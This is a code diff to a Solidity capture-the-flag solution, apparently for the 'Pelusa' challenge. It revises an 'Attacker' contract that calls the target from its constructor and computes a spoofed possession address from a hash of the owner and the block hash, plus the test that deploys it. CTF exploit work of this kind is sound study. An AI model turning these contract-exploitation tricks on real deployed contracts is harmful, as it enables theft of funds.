@@ -12,17 +12,9 @@ contract Attacker is IGame {
     uint256 public goals;
     Pelusa private immutable target;
 
-    constructor(Pelusa _target) {
+    constructor(Pelusa _target, address _owner) {
         target = _target;
-        owner = address(
-            uint160(
-                uint256(
-                    keccak256(
-                        abi.encodePacked(msg.sender, blockhash(block.number))
-                    )
-                )
-            )
-        );
+        owner = _owner;
 
         _target.passTheBall();
     }
@@ -32,7 +24,16 @@ contract Attacker is IGame {
     }
 
     function getBallPossesion() external view override returns (address) {
-        return owner;
+        return
+            address(
+                uint160(
+                    uint256(
+                        keccak256(
+                            abi.encodePacked(owner, blockhash(block.number))
+                        )
+                    )
+                )
+            );
     }
 
     function handOfGod() external returns (uint256) {
@@ -53,7 +54,7 @@ contract PelusaTest is Test {
         return
             abi.encodePacked(
                 type(Attacker).creationCode,
-                abi.encode(challenge)
+                abi.encode(challenge, address(this))
             );
     }
 
